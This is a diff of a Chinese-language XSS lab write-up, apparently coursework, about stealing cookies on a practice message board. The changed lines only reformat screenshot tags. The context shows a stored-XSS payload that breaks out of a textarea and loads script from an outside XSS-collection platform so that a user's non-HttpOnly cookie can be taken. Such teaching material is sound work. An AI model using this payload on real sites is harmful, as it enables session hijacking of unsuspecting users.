@@ -246,13 +246,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" and !empty($_POST["jsr"] and !empty($_P
 
 我们提前在留言板注册了用户c1、`c2`，可看到他们之间的留言正常显示
 
-<img src="./pics/Screen Shot 2020-11-11 at 11.52.37.png" alt="Screen Shot 2020-11-11 at 11.52.37" style="zoom:50%;" />
+<img src="./pics/Screen Shot 2020-11-11 at 11.52.37.png" alt="Screen Shot 2020-11-11 at 11.52.37" style="zoom: 33%;" />
 
-![Screen Shot 2020-11-11 at 11.54.19](./pics/Screen Shot 2020-11-11 at 11.54.19.png)
+<img src="./pics/Screen Shot 2020-11-11 at 11.54.19.png" alt="Screen Shot 2020-11-11 at 11.54.19" style="zoom:67%;" />
 
 查看浏览器Cookie，可以看到PHP的session，以及我们提前设置的Cookie。这个Cookie是没有HttpOnly保护的。
 
-![Screen Shot 2020-11-11 at 11.54.56](/Users/raidriarb/Library/Application Support/typora-user-images/Screen Shot 2020-11-11 at 11.54.56.png)
+<img src="/Users/raidriarb/Library/Application Support/typora-user-images/Screen Shot 2020-11-11 at 11.54.56.png" alt="Screen Shot 2020-11-11 at 11.54.56" style="zoom:67%;" />
 
 在XSS在线平台`https://xs.sb`注册一个账号，建立XSS项目设置我们需要执行的payload，并保存平台生成的链接。
 
@@ -262,7 +262,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" and !empty($_POST["jsr"] and !empty($_P
 >
 > 到时候记得自己注册一个
 
-![Screen Shot 2020-11-11 at 11.58.15](./pics/Screen Shot 2020-11-11 at 11.58.15.png)
+<img src="./pics/Screen Shot 2020-11-11 at 11.58.15.png" alt="Screen Shot 2020-11-11 at 11.58.15" style="zoom:150%;" />
 
 接下来c2向c1发送了这样一条信息`</textarea>'"><script src=//xs.sb/pou2></script>`
 
